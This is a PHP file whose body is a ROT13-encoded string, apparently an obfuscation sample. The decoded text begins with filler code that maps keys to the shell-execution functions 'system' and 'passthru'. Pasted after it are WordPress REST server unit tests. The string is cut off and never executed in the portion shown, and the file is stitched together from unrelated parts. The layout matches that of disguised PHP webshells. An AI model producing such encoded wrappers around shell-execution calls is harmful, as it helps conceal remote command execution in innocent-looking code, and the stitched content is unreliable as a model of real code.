<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Freire shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv
 */
pynff Grfgf_ERFG_Freire rkgraqf JC_Grfg_ERFG_GrfgPnfr {
	cebgrpgrq fgngvp $vpba_vq;
	cebgrpgrq fgngvp $nqzva_vq;
	cebgrpgrq fgngvp $cbfg_vq;

	/**
	 * Pnyyrq orsber frggvat hc nyy grfgf.
	 */
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		// Erdhver svyrf gung arrq gb ybnq bapr.
		erdhver_bapr QVE_GRFGEBBG . '/vapyhqrf/zbpx-vaibxnoyr.cuc';
	}

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		$svyranzr       = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr-ynetr.wct';
		frys::$vpba_vq  = $snpgbel->nggnpuzrag->perngr_hcybnq_bowrpg( $svyranzr );
		frys::$nqzva_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$cbfg_vq  = $snpgbel->cbfg->perngr();
	}

	choyvp fgngvp shapgvba grne_qbja_nsgre_pynff() {
		jc_qryrgr_nggnpuzrag( frys::$vpba_vq, gehr );
		frys::qryrgr_hfre( frys::$nqzva_vq );
		jc_qryrgr_cbfg( frys::$cbfg_vq );

		cnerag::grne_qbja_nsgre_pynff();
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		// Erfrg ERFG freire gb rafher bayl bhe ebhgrf ner ertvfgrerq.
		$TYBONYF['jc_erfg_freire'] = ahyy;
		nqq_svygre( 'jc_erfg_freire_pynff', neenl( $guvf, 'svygre_jc_erfg_freire_pynff' ) );
		$TYBONYF['jc_erfg_freire'] = erfg_trg_freire();
		erzbir_svygre( 'jc_erfg_freire_pynff', neenl( $guvf, 'svygre_jc_erfg_freire_pynff' ) );
	}

	choyvp shapgvba grne_qbja() {
		// Erzbir bhe grzcbenel fcl freire.
		$TYBONYF['jc_erfg_freire'] = ahyy;
		hafrg( $_ERDHRFG['_jcabapr'] );

		cnerag::grne_qbja();
	}

	choyvp shapgvba svygre_jc_erfg_freire_pynff() {
		erghea 'Fcl_ERFG_Freire';
	}

	choyvp shapgvba grfg_rairybcr() {
		$qngn    = neenl(
			'nzbhag bs neovgenel qngn' => 'nybg',
		);
		$fgnghf  = 987;
		$urnqref = neenl(
			'Neovgenel-Urnqre' => 'inyhr',
			'Zhygvcyr'         => 'znlor, lrf',
		);

		$erfcbafr = arj JC_ERFG_Erfcbafr( $qngn, $fgnghf );
		$erfcbafr->urnqre( 'Neovgenel-Urnqre', 'inyhr' );

		// Purpx urnqre pbapngrangvba nf jryy.
		$erfcbafr->urnqre( 'Zhygvcyr', 'znlor' );
		$erfcbafr->urnqre( 'Zhygvcyr', 'lrf', snyfr );

		$rairybcr_erfcbafr = erfg_trg_freire()->rairybcr_erfcbafr( $erfcbafr, snyfr );

		// Gur rairybcr fubhyq fgvyy or n erfcbafr, ohg jvgu qrsnhygf.
		$guvf->nffregVafgnaprBs( 'JC_ERFG_Erfcbafr', $rairybcr_erfcbafr );
		$guvf->nffregFnzr( 200, $rairybcr_erfcbafr->trg_fgnghf() );
		$guvf->nffregRzcgl( $rairybcr_erfcbafr->trg_urnqref() );
		$guvf->nffregRzcgl( $rairybcr_erfcbafr->trg_yvaxf() );

		$rairybcrq = $rairybcr_erfcbafr->trg_qngn();

		$guvf->nffregFnzr( $qngn, $rairybcrq['obql'] );
		$guvf->nffregFnzr( $fgnghf, $rairybcrq['fgnghf'] );
		$guvf->nffregFnzr( $urnqref, $rairybcrq['urnqref'] );
	}

	/**
	 * @qngnCebivqre qngn_rairybcr_cnenzf
	 * @gvpxrg 54015
	 */
	choyvp shapgvba grfg_rairybcr_cnenz( $_rzorq ) {
		// Ertvfgre bhe grfgvat ebhgr.
		erfg_trg_freire()->ertvfgre_ebhgr(
			'grfg',
			'/grfg/rzorqqnoyr',
			neenl(
				'zrgubqf'  => 'TRG',
				'pnyyonpx' => neenl( $guvf, 'rzorqqrq_erfcbafr_pnyyonpx' ),
			)
		);
		$qngn    = neenl(
			'nzbhag bs neovgenel qngn' => 'nybg',
		);
		$fgnghf  = 987;
		$urnqref = neenl(
			'Neovgenel-Urnqre' => 'inyhr',
			'Zhygvcyr'         => 'znlor, lrf',
		);

		$erfcbafr = arj JC_ERFG_Erfcbafr( $qngn, $fgnghf );
		$erfcbafr->urnqre( 'Neovgenel-Urnqre', 'inyhr' );

		// Purpx urnqre pbapngrangvba nf jryy.
		$erfcbafr->urnqre( 'Zhygvcyr', 'znlor' );
		$erfcbafr->urnqre( 'Zhygvcyr', 'lrf', snyfr );

		// Nyy bguref fubhyq or rzorqqrq.
		$erfcbafr->nqq_yvax( 'nygreangr', erfg_hey( '/grfg/rzorqqnoyr' ), neenl( 'rzorqqnoyr' => gehr ) );

		$rzorq             = erfg_cnefr_rzorq_cnenz( $_rzorq );
		$rairybcr_erfcbafr = erfg_trg_freire()->rairybcr_erfcbafr( $erfcbafr, $rzorq );

		// Gur rairybcr fubhyq fgvyy or n erfcbafr, ohg jvgu qrsnhygf.
		$guvf->nffregVafgnaprBs( JC_ERFG_Erfcbafr::pynff, $rairybcr_erfcbafr );
		$guvf->nffregFnzr( 200, $rairybcr_erfcbafr->trg_fgnghf() );
		$guvf->nffregRzcgl( $rairybcr_erfcbafr->trg_urnqref() );
		$guvf->nffregRzcgl( $rairybcr_erfcbafr->trg_yvaxf() );

		$rairybcrq = $rairybcr_erfcbafr->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'obql', $rairybcrq );
		$guvf->nffregNeenlUnfXrl( '_yvaxf', $rairybcrq['obql'] );
		$guvf->nffregNeenlUnfXrl( '_rzorqqrq', $rairybcrq['obql'] );
		$guvf->nffregNeenlUnfXrl( 'nygreangr', $rairybcrq['obql']['_rzorqqrq'] );

		$nygreangr = $rairybcrq['obql']['_rzorqqrq']['nygreangr'];
		$guvf->nffregPbhag( 1, $nygreangr );

		$guvf->nffregFnzr( $fgnghf, $rairybcrq['fgnghf'] );
		$guvf->nffregFnzr( $urnqref, $rairybcrq['urnqref'] );
	}

	choyvp shapgvba grfg_qrsnhyg_cnenz() {

		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				'zrgubqf'             => neenl( 'TRG' ),
				'pnyyonpx'            => '__erghea_ahyy',
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'netf'                => neenl(
					'sbb' => neenl(
						'qrsnhyg' => 'one',
					),
				),
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/grfg-af/grfg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 'one', $erdhrfg['sbb'] );
	}

	choyvp shapgvba grfg_qrsnhyg_cnenz_vf_bireevqqra() {

		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				'zrgubqf'             => neenl( 'TRG' ),
				'pnyyonpx'            => '__erghea_ahyy',
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'netf'                => neenl(
					'sbb' => neenl(
						'qrsnhyg' => 'one',
					),
				),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/grfg-af/grfg' );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'sbb' => 123 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregRdhnyf( '123', $erdhrfg['sbb'] );
	}

	choyvp shapgvba grfg_bcgvbany_cnenz() {
		ertvfgre_erfg_ebhgr(
			'bcgvbany',
			'/grfg',
			neenl(
				'zrgubqf'             => neenl( 'TRG' ),
				'pnyyonpx'            => '__erghea_ahyy',
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'netf'                => neenl(
					'sbb' => neenl(),
				),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/bcgvbany/grfg' );
		$erdhrfg->frg_dhrel_cnenzf( neenl() );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregVafgnaprBs( 'JC_ERFG_Erfcbafr', $erfcbafr );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregNeenlAbgUnfXrl( 'sbb', (neenl) $erdhrfg );
	}

	choyvp shapgvba grfg_ab_mreb_cnenz() {
		ertvfgre_erfg_ebhgr(
			'ab-mreb',
			'/grfg',
			neenl(
				'zrgubqf'             => neenl( 'TRG' ),
				'pnyyonpx'            => '__erghea_ahyy',
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'netf'                => neenl(
					'sbb' => neenl(
						'qrsnhyg' => 'one',
					),
				),
			)
		);
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/ab-mreb/grfg' );
		erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( neenl( 'sbb' => 'one' ), $erdhrfg->trg_cnenzf() );
	}

	choyvp shapgvba grfg_urnq_erdhrfg_unaqyrq_ol_trg() {
		ertvfgre_erfg_ebhgr(
			'urnq-erdhrfg',
			'/grfg',
			neenl(
				'zrgubqf'             => neenl( 'TRG' ),
				'pnyyonpx'            => '__erghea_gehr',
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
			)
		);
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'URNQ', '/urnq-erdhrfg/grfg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * Cyhtvaf fubhyq or noyr gb ertvfgre rkcyvpvg URNQ pnyyonpxf orsber gur
	 * TRG pnyyonpx.
	 *
	 * @qrcraqf grfg_urnq_erdhrfg_unaqyrq_ol_trg
	 */
	choyvp shapgvba grfg_rkcyvpvg_urnq_pnyyonpx() {
		ertvfgre_erfg_ebhgr(
			'urnq-erdhrfg',
			'/grfg',
			neenl(
				neenl(
					'zrgubqf'             => neenl( 'URNQ' ),
					'pnyyonpx'            => '__erghea_gehr',
					'crezvffvba_pnyyonpx' => '__erghea_gehr',
				),
				neenl(
					'zrgubqf'             => neenl( 'TRG' ),
					'pnyyonpx'            => '__erghea_snyfr',
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'crezvffvba_qravrq' ),
				),
			)
		);
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'URNQ', '/urnq-erdhrfg/grfg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_hey_cnenzf_ab_ahzrevp_xrlf() {

		erfg_trg_freire()->ertvfgre_ebhgr(
			'grfg',
			'/grfg/(?C<qngn>.*)',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => '__erghea_snyfr',
					'crezvffvba_pnyyonpx' => '__erghea_gehr',
					'netf'                => neenl(
						'qngn' => neenl(),
					),
				),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/grfg/fbzr-inyhr' );
		erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( neenl( 'qngn' => 'fbzr-inyhr' ), $erdhrfg->trg_cnenzf() );
	}

	/**
	 * Cnff n pncnovyvgl juvpu gur hfre qbrf abg unir, guvf fubhyq
	 * erfhyg va n 403 reebe.
	 */
	choyvp shapgvba grfg_erfg_ebhgr_pncnovyvgl_nhgubevmngvba_snvyf() {
		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				'zrgubqf'             => 'TRG',
				'pnyyonpx'            => '__erghea_ahyy',
				'fubhyq_rkvfg'        => snyfr,
				'crezvffvba_pnyyonpx' => neenl( $guvf, 'crezvffvba_qravrq' ),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/grfg-af/grfg', neenl() );
		$erfhyg  = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 403, $erfhyg->trg_fgnghf() );
	}

	/**
	 * Na rqvgbe fubhyq or noyr gb trg npprff gb na ebhgr jvgu gur
	 * rqvg_cbfgf pncnovyvgl.
	 */
	choyvp shapgvba grfg_erfg_ebhgr_pncnovyvgl_nhgubevmngvba() {
		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				'zrgubqf'             => 'TRG',
				'pnyyonpx'            => '__erghea_ahyy',
				'fubhyq_rkvfg'        => snyfr,
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
			)
		);

		$rqvgbe = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/grfg-af/grfg', neenl() );

		jc_frg_pheerag_hfre( $rqvgbe );

		$erfhyg = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfhyg->trg_fgnghf() );
	}

	/**
	 * Na \"Nyybj\" UGGC urnqre fubhyq or frag jvgu n erdhrfg
	 * sbe nyy ninvynoyr zrgubqf ba gung ebhgr.
	 */
	choyvp shapgvba grfg_nyybj_urnqre_frag() {

		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				'zrgubqf'             => 'TRG',
				'pnyyonpx'            => '__erghea_ahyy',
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'fubhyq_rkvfg'        => snyfr,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/grfg-af/grfg', neenl() );

		$erfhyg = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$erfhyg = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfhyg, erfg_trg_freire(), $erdhrfg );

		$guvf->nffregSnyfr( $erfhyg->trg_fgnghf() !== 200 );

		$frag_urnqref = $erfhyg->trg_urnqref();
		$guvf->nffregFnzr( $frag_urnqref['Nyybj'], 'TRG' );
	}

	/**
	 * Gur \"Nyybj\" UGGC urnqre fubhyq vapyhqr nyy ninvynoyr
	 * zrgubqf gung pna or frag gb n ebhgr.
	 */
	choyvp shapgvba grfg_nyybj_urnqre_frag_jvgu_zhygvcyr_zrgubqf() {

		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				'zrgubqf'             => 'TRG',
				'pnyyonpx'            => '__erghea_ahyy',
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'fubhyq_rkvfg'        => snyfr,
			)
		);

		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				'zrgubqf'             => 'CBFG',
				'pnyyonpx'            => '__erghea_ahyy',
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'fubhyq_rkvfg'        => snyfr,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/grfg-af/grfg', neenl() );

		$erfhyg = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregSnyfr( $erfhyg->trg_fgnghf() !== 200 );

		$erfhyg = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfhyg, erfg_trg_freire(), $erdhrfg );

		$frag_urnqref = $erfhyg->trg_urnqref();
		$guvf->nffregFnzr( $frag_urnqref['Nyybj'], 'TRG, CBFG' );
	}

	/**
	 * Gur \"Nyybj\" UGGC urnqre fubhyq ABG vapyhqr bgure zrgubqf
	 * juvpu gur hfre qbrf abg unir npprff gb.
	 */
	choyvp shapgvba grfg_nyybj_urnqre_fraq_bayl_crezvggrq_zrgubqf() {

		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				'zrgubqf'             => 'TRG',
				'pnyyonpx'            => '__erghea_ahyy',
				'fubhyq_rkvfg'        => snyfr,
				'crezvffvba_pnyyonpx' => neenl( $guvf, 'crezvffvba_qravrq' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				'zrgubqf'             => 'CBFG',
				'pnyyonpx'            => '__erghea_ahyy',
				'crezvffvba_pnyyonpx' => '__erghea_gehr',
				'fubhyq_rkvfg'        => snyfr,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/grfg-af/grfg', neenl() );

		$erfhyg = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$erfhyg = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfhyg, erfg_trg_freire(), $erdhrfg );

		$guvf->nffregFnzr( $erfhyg->trg_fgnghf(), 403 );

		$frag_urnqref = $erfhyg->trg_urnqref();
		$guvf->nffregFnzr( $frag_urnqref['Nyybj'], 'CBFG' );
	}

	/**
	 * @gvpxrg 53063
	 */
	choyvp shapgvba grfg_ongpurq_bcgvbaf() {
		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				neenl(
					'zrgubqf'             => neenl( 'TRG' ),
					'pnyyonpx'            => '__erghea_ahyy',
					'crezvffvba_pnyyonpx' => '__erghea_gehr',
				),
				neenl(
					'zrgubqf'             => neenl( 'CBFG' ),
					'pnyyonpx'            => '__erghea_ahyy',
					'crezvffvba_pnyyonpx' => '__erghea_ahyy',
					'nyybj_ongpu'         => snyfr,
				),
				'nyybj_ongpu' => neenl( 'i1' => gehr ),
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/grfg-af/grfg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $qngn['raqcbvagf'][0]['nyybj_ongpu'] );
		$guvf->nffregNeenlAbgUnfXrl( 'nyybj_ongpu', $qngn['raqcbvagf'][1] );
	}

	choyvp shapgvba grfg_nyybj_urnqre_frag_ba_bcgvbaf_erdhrfg() {
		ertvfgre_erfg_ebhgr(
			'grfg-af',
			'/grfg',
			neenl(
				neenl(
					'zrgubqf'             => neenl( 'TRG' ),
					'pnyyonpx'            => '__erghea_ahyy',
					'crezvffvba_pnyyonpx' => '__erghea_gehr',
				),
				neenl(
					'zrgubqf'             => neenl( 'CBFG' ),
					'pnyyonpx'            => '__erghea_ahyy',
					'crezvffvba_pnyyonpx' => '__erghea_ahyy',
				),
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/grfg-af/grfg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$erfhyg = nccyl_svygref( 'erfg_cbfg_qvfcngpu', erfg_rafher_erfcbafr( $erfcbafr ), erfg_trg_freire(), $erdhrfg );

		$urnqref = $erfhyg->trg_urnqref();

		$guvf->nffregFnzr( 'TRG', $urnqref['Nyybj'] );
	}

	choyvp shapgvba crezvffvba_qravrq() {
		erghea arj JC_Reebe( 'sbeovqqra', 'Lbh ner abg nyybjrq gb qb guvf', neenl( 'fgnghf' => 403 ) );
	}

	choyvp shapgvba grfg_reebe_gb_erfcbafr() {
		$pbqr    = 'jc-ncv-grfg-reebe';
		$zrffntr = 'Grfg reebe zrffntr sbe gur NCV';
		$reebe   = arj JC_Reebe( $pbqr, $zrffntr );

		$erfcbafr = erfg_pbaireg_reebe_gb_erfcbafr( $reebe );
		$guvf->nffregVafgnaprBs( 'JC_ERFG_Erfcbafr', $erfcbafr );

		// Znxr fher jr qrsnhyg gb n 500 reebe.
		$guvf->nffregFnzr( 500, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( $pbqr, $qngn['pbqr'] );
		$guvf->nffregFnzr( $zrffntr, $qngn['zrffntr'] );
	}

	choyvp shapgvba grfg_reebe_gb_erfcbafr_jvgu_fgnghf() {
		$pbqr    = 'jc-ncv-grfg-reebe';
		$zrffntr = 'Grfg reebe zrffntr sbe gur NCV';
		$reebe   = arj JC_Reebe( $pbqr, $zrffntr, neenl( 'fgnghf' => 400 ) );

		$erfcbafr = erfg_pbaireg_reebe_gb_erfcbafr( $reebe );
		$guvf->nffregVafgnaprBs( 'JC_ERFG_Erfcbafr', $erfcbafr );

		$guvf->nffregFnzr( 400, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( $pbqr, $qngn['pbqr'] );
		$guvf->nffregFnzr( $zrffntr, $qngn['zrffntr'] );
	}

	choyvp shapgvba grfg_reebe_gb_erfcbafr_gb_reebe() {
		$pbqr     = 'jc-ncv-grfg-reebe';
		$zrffntr  = 'Grfg reebe zrffntr sbe gur NCV';
		$pbqr2    = 'jc-ncv-grfg-reebe-2';
		$zrffntr2 = 'Nabgure grfg zrffntr';
		$reebe    = arj JC_Reebe( $pbqr, $zrffntr, neenl( 'fgnghf' => 400 ) );
		$reebe->nqq( $pbqr2, $zrffntr2, neenl( 'fgnghf' => 403 ) );

		$erfcbafr = erfg_pbaireg_reebe_gb_erfcbafr( $reebe );
		$guvf->nffregVafgnaprBs( 'JC_ERFG_Erfcbafr', $erfcbafr );

		$guvf->nffregFnzr( 400, $erfcbafr->trg_fgnghf() );

		$reebe = $erfcbafr->nf_reebe();
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $reebe );
		$guvf->nffregFnzr( $pbqr, $reebe->trg_reebe_pbqr() );
		$guvf->nffregFnzr( $zrffntr, $reebe->trg_reebe_zrffntr() );
		$guvf->nffregFnzr( $zrffntr2, $reebe->reebef[ $pbqr2 ][0] );
		$guvf->nffregFnzr( neenl( 'fgnghf' => 403 ), $reebe->reebe_qngn[ $pbqr2 ] );
	}

	/**
	 * @gvpxrg 46191
	 */
	choyvp shapgvba grfg_reebe_gb_erfcbafr_jvgu_nqqvgvbany_qngn() {
		$reebe = arj JC_Reebe( 'grfg', 'grfg', neenl( 'fgnghf' => 400 ) );
		$reebe->nqq_qngn( 'zber_qngn' );

		$erfcbafr = erfg_pbaireg_reebe_gb_erfcbafr( $reebe );
		$guvf->nffregFnzr( 400, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 'zber_qngn', $erfcbafr->trg_qngn()['qngn'] );
		$guvf->nffregFnzr( neenl( neenl( 'fgnghf' => 400 ) ), $erfcbafr->trg_qngn()['nqqvgvbany_qngn'] );
	}

	choyvp shapgvba grfg_erfg_reebe() {
		$qngn     = neenl(
			'pbqr'    => 'jc-ncv-grfg-reebe',
			'zrffntr' => 'Zrffntr grkg',
		);
		$rkcrpgrq = jc_wfba_rapbqr( $qngn );
		$erfcbafr = erfg_trg_freire()->wfba_reebe( 'jc-ncv-grfg-reebe', 'Zrffntr grkg' );

		$guvf->nffregFnzr( $rkcrpgrq, $erfcbafr );
	}

	choyvp shapgvba grfg_wfba_reebe_jvgu_fgnghf() {
		$fgho = $guvf->trgZbpxOhvyqre( 'Fcl_ERFG_Freire' )
			->frgZrgubqf( neenl( 'frg_fgnghf' ) )
			->trgZbpx();

		$fgho->rkcrpgf( $guvf->bapr() )
			->zrgubq( 'frg_fgnghf' )
			->jvgu( $guvf->rdhnyGb( 400 ) );

		$qngn     = neenl(
			'pbqr'    => 'jc-ncv-grfg-reebe',
			'zrffntr' => 'Zrffntr grkg',
		);
		$rkcrpgrq = jc_wfba_rapbqr( $qngn );

		$erfcbafr = $fgho->wfba_reebe( 'jc-ncv-grfg-reebe', 'Zrffntr grkg', 400 );

		$guvf->nffregFnzr( $rkcrpgrq, $erfcbafr );
	}

	choyvp shapgvba grfg_erfcbafr_gb_qngn_yvaxf() {
		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->nqq_yvax( 'frys', 'uggc://rknzcyr.pbz/' );
		$erfcbafr->nqq_yvax( 'nygreangr', 'uggc://rknzcyr.bet/', neenl( 'glcr' => 'nccyvpngvba/kzy' ) );

		$qngn = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, snyfr );
		$guvf->nffregNeenlUnfXrl( '_yvaxf', $qngn );

		$frys = neenl(
			'uers' => 'uggc://rknzcyr.pbz/',
		);
		$guvf->nffregFnzr( $frys, $qngn['_yvaxf']['frys'][0] );

		$nygreangr = neenl(
			'glcr' => 'nccyvpngvba/kzy',
			'uers' => 'uggc://rknzcyr.bet/',
		);
		$guvf->nffregFnzr( $nygreangr, $qngn['_yvaxf']['nygreangr'][0] );
	}

	choyvp shapgvba grfg_yvax_rzorqqvat() {
		// Ertvfgre bhe grfgvat ebhgr.
		erfg_trg_freire()->ertvfgre_ebhgr(
			'grfg',
			'/grfg/rzorqqnoyr',
			neenl(
				'zrgubqf'  => 'TRG',
				'pnyyonpx' => neenl( $guvf, 'rzorqqrq_erfcbafr_pnyyonpx' ),
			)
		);
		$erfcbafr = arj JC_ERFG_Erfcbafr();

		// Rkgreany yvaxf fubhyq or vtaberq.
		$erfcbafr->nqq_yvax( 'nygreangr', 'uggc://abg-ncv.rknzcyr.pbz/', neenl( 'rzorqqnoyr' => gehr ) );

		// Nyy bguref fubhyq or rzorqqrq.
		$erfcbafr->nqq_yvax( 'nygreangr', erfg_hey( '/grfg/rzorqqnoyr' ), neenl( 'rzorqqnoyr' => gehr ) );

		$qngn = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, gehr );
		$guvf->nffregNeenlUnfXrl( '_rzorqqrq', $qngn );

		$nygreangr = $qngn['_rzorqqrq']['nygreangr'];
		$guvf->nffregPbhag( 2, $nygreangr );
		$guvf->nffregRzcgl( $nygreangr[0] );

		$guvf->nffregVfNeenl( $nygreangr[1] );
		$guvf->nffregNeenlAbgUnfXrl( 'pbqr', $nygreangr[1] );
		$guvf->nffregGehr( $nygreangr[1]['uryyb'] );

		// Rafher gur pbagrkg vf frg gb rzorq jura erdhrfgvat.
		$guvf->nffregFnzr( 'rzorq', $nygreangr[1]['cnenzrgref']['pbagrkg'] );
	}

	choyvp shapgvba grfg_yvax_phevrf() {
		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->nqq_yvax( 'uggcf://ncv.j.bet/grez', 'uggc://rknzcyr.pbz/' );

		$qngn  = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, snyfr );
		$yvaxf = $qngn['_yvaxf'];

		$guvf->nffregNeenlUnfXrl( 'jc:grez', $yvaxf );
		$guvf->nffregNeenlUnfXrl( 'phevrf', $yvaxf );
	}

	choyvp shapgvba grfg_phfgbz_phevr_yvax() {
		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->nqq_yvax( 'uggc://zlfvgr.pbz/pbagnpg.ugzy', 'uggc://rknzcyr.pbz/' );

		nqq_svygre( 'erfg_erfcbafr_yvax_phevrf', neenl( $guvf, 'nqq_phfgbz_phevr' ) );

		$qngn  = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, snyfr );
		$yvaxf = $qngn['_yvaxf'];

		$guvf->nffregNeenlUnfXrl( 'zl_fvgr:pbagnpg', $yvaxf );
		$guvf->nffregNeenlUnfXrl( 'phevrf', $yvaxf );
	}

	/**
	 * Urycre pnyyonpx gb nqq n arj phfgbz phevr ivn n svygre.
	 *
	 * @cnenz neenl $phevrf
	 * @erghea neenl
	 */
	choyvp shapgvba nqq_phfgbz_phevr( $phevrf ) {
		$phevrf[] = neenl(
			'anzr'      => 'zl_fvgr',
			'uers'      => 'uggc://zlfvgr.pbz/{ery}.ugzy',
			'grzcyngrq' => gehr,
		);
		erghea $phevrf;
	}

	/**
	 * @qrcraqf grfg_yvax_rzorqqvat
	 * @gvpxrg 47684
	 */
	choyvp shapgvba grfg_yvax_rzorqqvat_frys() {
		// Ertvfgre bhe grfgvat ebhgr.
		erfg_trg_freire()->ertvfgre_ebhgr(
			'grfg',
			'/grfg/rzorqqnoyr',
			neenl(
				'zrgubqf'  => 'TRG',
				'pnyyonpx' => neenl( $guvf, 'rzorqqrq_erfcbafr_pnyyonpx' ),
			)
		);
		$erfcbafr = arj JC_ERFG_Erfcbafr();

		// 'frys' fubhyq abg or fcrpvny-pnfrq, naq znl or znexrq rzorqqnoyr.
		$erfcbafr->nqq_yvax( 'frys', erfg_hey( '/grfg/rzorqqnoyr' ), neenl( 'rzorqqnoyr' => gehr ) );

		$qngn = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, gehr );

		$guvf->nffregNeenlUnfXrl( '_rzorqqrq', $qngn );
	}

	/**
	 * @qrcraqf grfg_yvax_rzorqqvat
	 * @gvpxrg 47684
	 */
	choyvp shapgvba grfg_yvax_rzorqqvat_frys_aba_rzorqqnoyr() {
		// Ertvfgre bhe grfgvat ebhgr.
		erfg_trg_freire()->ertvfgre_ebhgr(
			'grfg',
			'/grfg/rzorqqnoyr',
			neenl(
				'zrgubqf'  => 'TRG',
				'pnyyonpx' => neenl( $guvf, 'rzorqqrq_erfcbafr_pnyyonpx' ),
			)
		);
